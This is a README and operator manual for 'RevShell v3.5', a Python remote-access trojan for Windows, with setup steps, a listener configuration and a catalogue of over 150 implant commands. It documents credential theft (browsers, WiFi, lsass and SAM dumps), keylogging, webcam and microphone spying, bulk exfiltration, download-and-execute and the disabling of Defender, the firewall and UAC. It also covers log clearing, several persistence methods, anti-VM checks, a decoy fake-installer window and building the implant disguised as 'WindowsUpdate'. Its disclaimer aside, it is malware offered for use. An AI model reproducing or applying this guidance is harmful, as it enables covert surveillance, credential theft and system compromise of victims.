# RevShell v3.5 — Complete Guide

```
██████╗ ███████╗██╗   ██╗███████╗██╗   ██╗███████╗██╗     ██╗
██╔══██╗██╔════╝██║   ██║██╔════╝██║   ██║██╔════╝██║     ██║
██████╔╝█████╗  ██║   ██║███████╗████████║█████╗  ██║     ██║
██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔═══██║██╔══╝  ██║     ██║
██║  ██║███████╗ ╚████╔╝ ███████║██║   ██║███████╗███████╗██████╗
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝   ╚═╝╚══════╝╚══════╝╚═════╝
```

**Advanced Reverse Shell v3.5**

> **DISCLAIMER:** This project is **ONLY for educational purposes** and **authorized penetration testing**. Unauthorized use of this software against systems without explicit consent is **illegal** and may result in severe legal consequences.

---

## Table of Contents

1. [What is this?](#what-is-this)
2. [Requirements](#requirements)
3. [Initial Setup](#initial-setup-step-by-step)
4. [How to Run](#how-to-run)
5. [Complete Command Guide](#complete-command-guide)
6. [Usage Scenarios](#usage-scenarios-practical-examples)
7. [Technical Architecture](#technical-architecture-for-experts)
8. [Communication Protocol](#communication-protocol)
9. [Security & Encryption](#security--encryption)
10. [Persistence in Detail](#persistence-in-detail)
11. [Troubleshooting](#troubleshooting)
12. [Compile to .exe](#compile-to-exe-pyinstaller)
13. [Changelog v3.5](#changelog-v35)

---

## What is this?

RevShell v3.5 is an **advanced post-exploitation agent** for Windows systems, written in Python. It establishes an **encrypted reverse TCP connection** to a listener controlled by the attacker and provides a rich set of **150+ commands** covering:

- System enumeration and situational awareness
- Credential harvesting (browsers, WiFi, DPAPI, token stealing)
- File system interaction (upload, download, directory compression)
- Screen / microphone / webcam capture
- Keylogging and clipboard monitoring
- Persistence via multiple methods (registry, scheduled tasks, startup folder, WMI)
- Privilege escalation checks and hash dumping
- Lateral movement helpers (port scanning, port forwarding)
- Trolling and disruption features (mouse swapping, audio, popups)
- Self-destruction (`autodestroy`)

All traffic is encrypted using **RC4 with a random nonce and SHA-256 key derivation**, providing strong confidentiality for the C2 channel.

---

## Requirements

### Attacker (listener)

- **Python 3.6+** (any OS: Windows, Linux, macOS)
- No external libraries – uses only the Python Standard Library

### Victim (victim_win)

- **Windows 7/8/10/11** (also works on Server editions)
- **Python 3.6+** (if run as `.py`) or compiled with PyInstaller (no dependencies)
- All modules are from the **Python Standard Library**

### Network

- The attacker must have an **accessible port** (default `4444`)
- On local network: both machines on the same subnet
- Over the internet: use port forwarding or a VPS

---

## Initial Setup (Step by Step)

### Step 1: Determine Attacker IP

```bash
# On Windows (attacker):
ipconfig

# On Linux:
ip a
# or
ifconfig
```

Look for your network interface IP (e.g., 192.168.1.100, 10.0.0.5).

**Important:**

- Same local network → Use private IP (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
- Testing on same machine → Use 127.0.0.1
- Over the internet → Use your public IP or domain

### Step 2: Configure victim_win.py

Open `victim_win.py` and modify the configuration block at the top:

```python
# --- CONFIGURATION ---
ATTACKER_IP = "192.168.1.100"    # ← SET YOUR ATTACKER MACHINE IP HERE
ATTACKER_PORT = 4444             # ← Port (must match listener)
SHARED_SECRET = b"R3vSh3ll_v3_S3cr3t_K3y!"   # Change this!
RECONNECT_DELAY = 5
BEACON_JITTER = True
BEACON_MIN = 3
BEACON_MAX = 10
```

### Step 3: Configure listener.py

Open `listener.py` and verify:

```python
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444
SHARED_SECRET = b"R3vSh3ll_v3_S3cr3t_K3y!"   # Must match victim!
```

> **IMPORTANT:** `SHARED_SECRET` and `PORT` must be **IDENTICAL** in both files. The secret is used to derive the RC4 encryption key.

### Step 4: Firewall

On Windows attacker, allow the port:

```powershell
netsh advfirewall firewall add rule name="RevShell" dir=in action=allow protocol=TCP localport=4444
```

On Linux:

```bash
sudo ufw allow 4444/tcp
```

---

## How to Run

### 1. First: Start the Listener (on your machine)

```bash
python listener.py
```

You'll see the banner and:

```
[*] Listening on 0.0.0.0:4444...
    Type 'help' to see available commands
```

### 2. Second: Run the Victim (on the target machine)

```bash
python victim_win.py
```

Or if compiled:

```bash
victim_win.exe
```

### 3. Connection Established!

On the listener you'll see something like:

```
[+] Connection received from 192.168.1.50:54321!
[+] Connected: user@PC-VICTIM (user) in C:\Users\user [v3.5]
```

Now you have a `shell>` prompt where you can type commands.

---

## Complete Command Guide

### Navigation & File System

| Command | Example | Description |
|---|---|---|
| `cd <dir>` | `cd C:\Users` | Change working directory |
| `pwd` | `pwd` | Print working directory |
| `ls [dir]` | `ls` or `ls C:\Windows` | List directory contents with details |
| `tree [dir] [depth]` | `tree . 3` | Display directory tree (default depth=3) |
| `download <file>` | `download C:\Users\user\secret.docx` | Download a file from victim |
| `upload <file>` | `upload payload.exe` | Upload a file to victim's current directory |
| `download_dir <dir>` | `download_dir C:\Users\user\Documents` | Compress a directory and download as ZIP |
| `cat <file>` | `cat notes.txt` | View text file contents |
| `head <file> [n]` | `head large.log 50` | Show first N lines (default 20) |
| `tail <file> [n]` | `tail large.log 30` | Show last N lines (default 20) |
| `search <pattern>` | `search *.pdf` | Search files by name starting from C:\ |
| `grep <text> [path]` | `grep password *.txt` | Search for text inside files |
| `file_info <path>` | `file_info secret.docx` | Show size, timestamps, permissions, MD5/SHA256 |
| `touch <file>` | `touch new.txt` | Create empty file or update timestamp |
| `mkdir <dir>` | `mkdir C:\temp\new` | Create directory |
| `rmdir <path>` | `rmdir C:\temp\old` | Remove file or directory |
| `mv <src> <dst>` | `mv old.txt new.txt` | Move / rename |
| `cp <src> <dst>` | `cp file.txt backup\` | Copy file or directory |
| `write <file> <content>` | `write note.txt "Hello"` | Write content to file (overwrites) |
| `append <file> <content>` | `append log.txt "New entry"` | Append a line to file |
| `chattr <file> [timestamp]` | `chattr file.txt "2020-01-01 12:00:00"` | Change file timestamps |

### Data Collection (return a file)

| Command | Description |
|---|---|
| `steal` | Archive Desktop, Downloads, Documents, Pictures, Videos → ZIP |
| `sysinfo` | Full system enumeration → TAR (20+ artifacts) |
| `screenshot` | Take a screenshot → PNG |
| `browsers` | Steal Chrome/Edge/Brave/Opera/Firefox data → ZIP |
| `exfil` | Total exfiltration (sysinfo + wifi + screenshot + clipboard + browsers + software + registry) → TAR |
| `record_screen <sec>` | Record screen at 10 fps → ZIP of JPG frames |
| `record_mic <sec>` | Record microphone → WAV |
| `webcam_snap` | Take a picture from webcam → JPG |
| `scrloop start [interval]` | Start periodic screenshots (default every 5s) |
| `scrloop stop` | Stop periodic screenshots |
| `scrloop dump` | Download all captured screenshots as ZIP |
| `scrloop clear` | Delete captured screenshots |

### Credentials & Secrets

| Command | Description |
|---|---|
| `wifi` | Show all saved WiFi passwords in plain text |
| `credvault` | Dump Windows Credential Manager + DPAPI files |
| `find_secrets` | Search for SSH keys, .env, VPN configs, KeePass DBs, cloud credentials, etc. |
| `ssh_keys` | List and display SSH keys from %USERPROFILE%\.ssh |
| `token_steal` | Show whoami /all, stored credentials, active sessions |

### Information & Reconnaissance

| Command | Description |
|---|---|
| `status` | Basic info: user, host, local IP, admin, PID, cwd, uptime |
| `quick_info` | Quick overview: user, host, LAN/WAN IP, OS version, Defender status |
| `geolocate` | Approximate geolocation via ipinfo.io |
| `proc_list` | List running processes (table format) |
| `software` | List installed software |
| `net_scan [subnet]` | Ping sweep of a /24 subnet |
| `port_scan <ip> [ports]` | TCP port scan (default: common 24 ports) |
| `dns_lookup <domain>` | DNS resolution + MX records |
| `traceroute <host>` | Trace route to host |
| `arp_table` | Show ARP table |
| `list_wifi` | Show nearby WiFi networks |
| `active_conn` | Established TCP connections + listening ports |
| `netstat` | Full netstat -ano output |
| `privesc` | Analyze privilege escalation vectors |
| `getenv [var]` | Show environment variables |
| `disk_info` | Show disk partitions, size, free space |
| `uptime` | System uptime |
| `screen_res` | Screen resolution(s) |
| `idle_time` | User idle time |
| `timezone` | System timezone |
| `recent_files` | Recently opened files |
| `drivers` | Installed drivers |
| `startup_list` | Startup programs (registry, folder, scheduled tasks) |
| `shares` | Shared folders (net share) |
| `whoami` | whoami /all output |
| `hostname` | Hostname and FQDN |

### Users & System

| Command | Description |
|---|---|
| `net_user [username]` | List local users or details of a specific user |
| `net_group [group]` | List local groups or members of a specific group |
| `reg_query <path>` | Query Windows registry |

### Application Control

| Command | Description |
|---|---|
| `kill_app <name>` | Kill process by name (e.g., `kill_app chrome`) |
| `open_app <path/name>` | Launch application in background |
| `hide_app <name>` | Hide windows of a process |
| `show_app <name>` | Restore hidden windows |

### Disruption & Trolling

| Command | Description |
|---|---|
| `lock_screen` | Lock the workstation |
| `change_wallpaper <path>` | Change desktop wallpaper to local image |
| `wallpaper_url <url>` | Download image from URL and set as wallpaper |
| `alert <msg>` | Show simple popup message |
| `msgbox <title>\|<text>` | Show popup with custom title |
| `play_sound` | Emit a beep |
| `set_volume <0-100>` | Set system master volume |
| `tts <text>` | Text-to-speech (speaks through speakers) |
| `type_text <text>` | Simulate keyboard typing |
| `open_url <url>` | Open URL in default browser |
| `swap_mouse` | Swap left/right mouse buttons |
| `restore_mouse` | Restore mouse buttons |
| `hide_taskbar` | Hide Windows taskbar |
| `show_taskbar` | Show Windows taskbar |
| `crazy_cursor [sec]` | Move cursor randomly for N seconds (default 10) |
| `open_cd` / `close_cd` | Open/close CD/DVD tray |

### Clipboard

| Command | Description |
|---|---|
| `clipboard` | Read current clipboard content |
| `clip_set <text>` | Write text to clipboard |
| `clip_monitor start` | Start monitoring clipboard changes |
| `clip_monitor stop` | Stop clipboard monitor |
| `clip_monitor dump` | Show captured clipboard history |
| `clip_monitor clear` | Clear clipboard history |
| `wipe_clipboard` | Erase clipboard content |
| `hosts_edit <domain> <ip>` | Add entry to hosts file (DNS spoofing) |

### Power Control

| Command | Description |
|---|---|
| `battery` | Show battery percentage and charging status |
| `reboot` | Reboot the system |
| `shutdown` | Shut down the system |
| `logoff` | Log off current user |

### Downloads & Remote Execution

| Command | Description |
|---|---|
| `download_url <url> [dest]` | Download file from internet to victim |
| `exec_remote <url>` | Download and execute a binary from URL |

### Port Forwarding (Pivoting)

| Command | Description |
|---|---|
| `port_fwd <lport> <rhost> <rport>` | Forward TCP traffic from victim's local port to remote host |
| `port_fwd_stop [lport]` | Stop one or all forwards |
| `port_fwd_list` | List active forwards |

### Persistence

| Command | Description |
|---|---|
| `persist [all\|registry\|task\|startup]` | Install persistence method(s) |
| `persist check` | Check status of all persistence methods |
| `persist toggle` | Toggle automatic re-installation of persistence |
| `persist remove` | Remove all persistence |

### Keylogger

| Command | Description |
|---|---|
| `keylog start` | Start PowerShell keylogger |
| `keylog stop` | Stop keylogger |
| `keylog dump` | Show captured keystrokes |
| `keylog clear` | Delete keylog file |

### Admin Commands (require Administrator)

| Command | Description |
|---|---|
| `disable_defender` | Disable Windows Defender real-time protection and add exclusions |
| `dump_hashes` | Save SAM, SYSTEM, SECURITY hives for offline cracking |
| `dump_lsass` | Create a minidump of lsass.exe (requires SeDebugPrivilege) |
| `disable_firewall` | Disable Windows Firewall |
| `disable_uac` | Disable User Account Control (registry) |
| `clear_logs` | Clear Windows Event Logs |
| `exclude_path <path>` | Add path to Defender exclusions |
| `exclude_ext <ext>` | Add extension to Defender exclusions |
| `enable_rdp` | Enable Remote Desktop |
| `add_user <user> <pass>` | Create a new local administrator user |
| `blue_screen` | Force a BSOD (Blue Screen of Death) |
| `disable_taskmgr` | Disable Task Manager |
| `enable_taskmgr` | Enable Task Manager |
| `disable_cmd` | Disable Command Prompt |
| `enable_cmd` | Enable Command Prompt |
| `shadow_list` | List volume shadow copies |
| `shadow_delete` | Delete all volume shadow copies |
| `sys_persist` | Install system-wide persistence (HKLM) |
| `persist_wmi` | Install WMI event subscription persistence |
| `safe_mode_persist` | Install persistence that survives Safe Mode |

### Cleanup & Exit

| Command | Description |
|---|---|
| `autodestroy` | Completely remove the implant (persistence, files, traces) and self-delete |
| `cleanup` | Delete all temporary files created by the implant |
| `ps <cmd>` | Execute a PowerShell command directly |
| `exit` | Close connection (victim will attempt to reconnect) |
| `kill_shell` | Terminate the victim process permanently |
| `<any command>` | Execute via cmd.exe |

### Local Commands (run on YOUR machine)

| Command | Description |
|---|---|
| `!<cmd>` | Execute command on the attacker's machine |
| `!clear` / `!cls` | Clear the listener screen |
| `help` | Show this command list (colored) |

---

## Usage Scenarios (Practical Examples)

### Scenario 1: Quick Reconnaissance

```
shell> status
shell> quick_info
shell> sysinfo
shell> wifi
shell> privesc
```

### Scenario 2: Total Data Exfiltration

```
shell> exfil
```

(Single command = all important data packaged and sent)

### Scenario 3: Stealthy Espionage

```
shell> keylog start
shell> clip_monitor start
shell> scrloop start 10
# ... wait ...
shell> scrloop dump
shell> keylog dump
shell> clip_monitor dump
shell> cleanup
```

### Scenario 4: Persistence + Privilege Escalation

```
shell> persist
shell> persist check
shell> privesc
# If admin...
shell> dump_hashes
shell> disable_defender
shell> add_user backdoor P@ssw0rd123!
```

### Scenario 5: Lateral Movement Pivoting

```
shell> net_scan
shell> port_scan 192.168.1.50 1-1024
shell> port_fwd 3389 192.168.1.50 3389
# Now connect from attacker to victim:3389 → internal RDP
```

### Scenario 6: Trolling the Victim

```
shell> tts "Hello, your system has been hacked"
shell> crazy_cursor 15
shell> wallpaper_url https://example.com/scary.jpg
shell> msgbox "Warning|Your files are encrypted"
```

### Scenario 7: Complete Self-Destruction

```
shell> autodestroy
```

(Victim process terminates and all traces are removed)

---

## Technical Architecture (For Experts)

### Code Structure

```
victim_win.py (~1500 lines)
├── CONFIGURATION
├── CRYPTO (RC4 + nonce + SHA-256)
├── HELPERS (run_cmd, run_ps, send_file_over_socket, safe_*, is_admin)
├── PERSISTENCE (install, check, remove, toggle)
├── DECOY (launch_decoy – fake installer GUI)
├── MODULES (50+ functions)
│   ├── gather_sysinfo, take_screenshot, get_wifi_passwords
│   ├── steal_browsers, full_exfil, record_screen, record_mic, webcam_snap
│   ├── keylogger, clipboard monitor, geolocate, privesc check
│   ├── network tools (port_scan, net_scan, port_fwd)
│   ├── file system tools (tree, grep, find_secrets, etc.)
│   ├── admin tools (dump_hashes, disable_defender, blue_screen, etc.)
│   └── trolling (swap_mouse, crazy_cursor, tts, etc.)
├── DISPATCHER (handle_command – routes 150+ commands)
└── CONNECTION LOOP (connect_and_loop with jitter)

listener.py (~500 lines)
├── CONFIGURATION & BANNER
├── CRYPTO (RC4 + nonce + SHA-256)
├── FILE HANDLERS (receive_file_data, handle_file_command, handle_download, handle_upload)
├── SESSION LOGGING
└── MAIN LOOP (accept connections, command dispatch)
```

### Encryption Upgrade: RC4 with Nonce

v3.5 replaces the trivial single-byte XOR with RC4 stream cipher and a random 8-byte nonce per message:

1. Generate random 8-byte nonce.
2. Derive key: SHA-256(SHARED_SECRET + nonce) → 32-byte RC4 key.
3. Encrypt payload with RC4.
4. Send: `[length][nonce][ciphertext]`.

This provides strong confidentiality and prevents replay attacks.

### Beacon Jitter

The client can randomize its reconnection delay:

```python
if BEACON_JITTER:
    delay = random.uniform(BEACON_MIN, BEACON_MAX)  # e.g., 3–10 seconds
else:
    delay = RECONNECT_DELAY
```

This helps evade detection based on fixed-interval callbacks.

### Anti-Sandbox & Decoy

- **VM detection:** Checks screen resolution, RAM size, BIOS manufacturer, and uptime. If a VM is suspected, the implant sleeps and exits.
- **Decoy GUI:** On first run, a fake "ModLoader Pro" installer window appears, showing a progress bar that eventually fails with an access denied error. This distracts the user while the implant runs in the background.

---

## Communication Protocol

### Packet Format

```
┌────────────────┬─────────────────────────────────┐
│ 4 bytes        │ N bytes                         │
│ length (BE)    │ nonce (8) + RC4-encrypted data  │
└────────────────┴─────────────────────────────────┘
```

- **Length:** 4-byte big-endian integer = total size of the following encrypted blob.
- **Encrypted blob:** nonce (8 bytes) || RC4(key, plaintext)

### File Transfer

Files are sent using the same chunked base64 method as previous versions, wrapped in the new RC4 encryption:

1. `FILE_START` marker (encrypted)
2. Chunks of 3 KB raw data, base64-encoded, sent as individual encrypted messages
3. `FILE_END` marker (encrypted)

The listener automatically detects file-returning commands and prompts for a save location.

---

## Security & Encryption

| Feature | v2.0 | v3.5 |
|---|---|---|
| Encryption | Single-byte XOR | RC4 with per-message nonce + SHA-256 key derivation |
| Key | Hardcoded 0x42 | SHARED_SECRET (configurable) |
| Replay protection | None | Nonce ensures unique ciphertext per message |
| Beacon obfuscation | Fixed delay | Jitter (randomized delay) |

> **Note:** While RC4 is no longer considered secure for TLS, it is more than adequate for obfuscating C2 traffic in a lab environment and significantly raises the bar compared to XOR.

---

## Persistence in Detail

v3.5 retains the three user-mode persistence methods from v2.0 and adds system-level persistence options when running as Administrator:

| Method | Command | Description |
|---|---|---|
| Registry (HKCU) | `persist registry` | Run key for current user |
| Scheduled Task | `persist task` | schtasks /sc onlogon |
| Startup Folder | `persist startup` | VBS script in Startup |
| System Registry (HKLM) | `sys_persist` | Run key for all users (requires admin) |
| WMI Event Subscription | `persist_wmi` | Triggers on system startup (requires admin) |
| Safe Mode Persistence | `safe_mode_persist` | Persists even when booting into Safe Mode |

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Connection refused | Ensure listener is running and IP/port match. Check firewall. |
| Connection drops immediately | Verify SHARED_SECRET matches on both sides. |
| Command times out | Some commands (e.g., sysinfo) take time. Increase timeout in run_cmd / run_ps. |
| Admin commands fail | Run the victim script as Administrator. |
| dump_lsass fails | Requires SeDebugPrivilege (usually only SYSTEM or elevated admin). |
| Decoy GUI doesn't appear | tkinter must be installed (it is part of the standard library, but some Python distributions omit it). This does not affect functionality. |

### Session Logs

All activity is logged to `session_logs/session_YYYY-MM-DD.log`:

```
[17:15:00] [192.168.1.50:54321] CONNECTED
[17:15:00] [192.168.1.50:54321] BANNER: [+] Connected: user@PC (user) in C:\Users\user [v3.5]
[17:15:05] [192.168.1.50:54321] CMD: status
[17:15:10] [192.168.1.50:54321] CMD: sysinfo
```

---

## Compile to .exe (PyInstaller)

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole victim_win.py
# Output: dist/victim_win.exe
```

To change the name and add an icon:

```bash
pyinstaller --onefile --noconsole --name "WindowsUpdate" --icon app.ico victim_win.py
```

> **Note:** Compiled executables are often detected by antivirus. This tool is for educational use only.

---

## Changelog v3.5

### New Features (since v2.0)

- RC4 encryption with per-message nonce and SHA-256 key derivation (replaces XOR)
- Beacon jitter – randomized reconnect delays
- Anti-VM checks – avoids running in sandboxes
- Decoy GUI – fake installer to distract the user
- **New Commands (50+):**
  - File system: `tree`, `grep`, `head`, `tail`, `write`, `append`, `chattr`, `file_info`, `search`
  - Collection: `record_screen`, `record_mic`, `webcam_snap`, `scrloop`
  - Credentials: `credvault`, `find_secrets`, `ssh_keys`, `token_steal`
  - Network: `port_scan`, `dns_lookup`, `traceroute`, `port_fwd`
  - Admin: `dump_lsass`, `disable_firewall`, `disable_uac`, `clear_logs`, `blue_screen`, `add_user`, `enable_rdp`, `sys_persist`, `persist_wmi`, `safe_mode_persist`, `shadow_list`/`shadow_delete`
  - Trolling: `tts`, `type_text`, `msgbox`, `wallpaper_url`, `swap_mouse`, `crazy_cursor`, `open_cd`/`close_cd`
  - Utilities: `download_url`, `exec_remote`, `quick_info`, `recent_files`, `idle_time`, `timezone`, `disk_info`
- Autodestroy – complete self-removal, including persistence and script files

### Improvements

- Centralized dispatcher handles 150+ commands cleanly
- All temporary files are placed in %TEMP% and cleaned up by `cleanup`
- PowerShell commands use `-NoProfile -NonInteractive -ExecutionPolicy Bypass`
- Subprocesses use `CREATE_NO_WINDOW` flag for stealth
- Environment variables used instead of hardcoded paths

### Fixes

- File transfer error handling improved
- Upload protocol robust against missing local files
- `steal` now includes size limits (50 MB per file, 500 MB total) to avoid memory issues

---

### Quick Command Reference

```
NAVIGATION:     cd | pwd | ls | tree
FILES:          download | upload | download_dir | cat | head | tail | search | grep | file_info
                touch | mkdir | rmdir | mv | cp | write | append | chattr
COLLECTION:     steal | sysinfo | screenshot | browsers | exfil | record_screen | record_mic
                webcam_snap | scrloop
CREDENTIALS:    wifi | credvault | find_secrets | ssh_keys | token_steal
INFO:           status | quick_info | geolocate | proc_list | software | net_scan | port_scan
                dns_lookup | traceroute | arp_table | list_wifi | active_conn | netstat
                privesc | getenv | disk_info | uptime | screen_res | idle_time | timezone
                recent_files | drivers | startup_list | shares | whoami | hostname
USERS:          net_user | net_group | reg_query
APPS:           kill_app | open_app | hide_app | show_app
TROLLING:       lock_screen | change_wallpaper | wallpaper_url | alert | msgbox | play_sound
                set_volume | tts | type_text | open_url | swap_mouse | restore_mouse
                hide_taskbar | show_taskbar | crazy_cursor | open_cd | close_cd
CLIPBOARD:      clipboard | clip_set | clip_monitor | wipe_clipboard | hosts_edit
POWER:          battery | reboot | shutdown | logoff
DOWNLOADS:      download_url | exec_remote
PORT FWD:       port_fwd | port_fwd_stop | port_fwd_list
PERSISTENCE:    persist [all|registry|task|startup|check|toggle|remove]
KEYLOGGER:      keylog start|stop|dump|clear
ADMIN:          disable_defender | disable_firewall | disable_uac | dump_hashes | dump_lsass
                clear_logs | exclude_path | exclude_ext | enable_rdp | add_user
                blue_screen | disable_taskmgr | enable_taskmgr | disable_cmd | enable_cmd
                shadow_list | shadow_delete | sys_persist | persist_wmi | safe_mode_persist
CLEANUP:        autodestroy | cleanup | ps | exit | kill_shell
LOCAL:          !cmd | !clear | help
```

---

*RevShell v3.5 — Made for educational purposes*
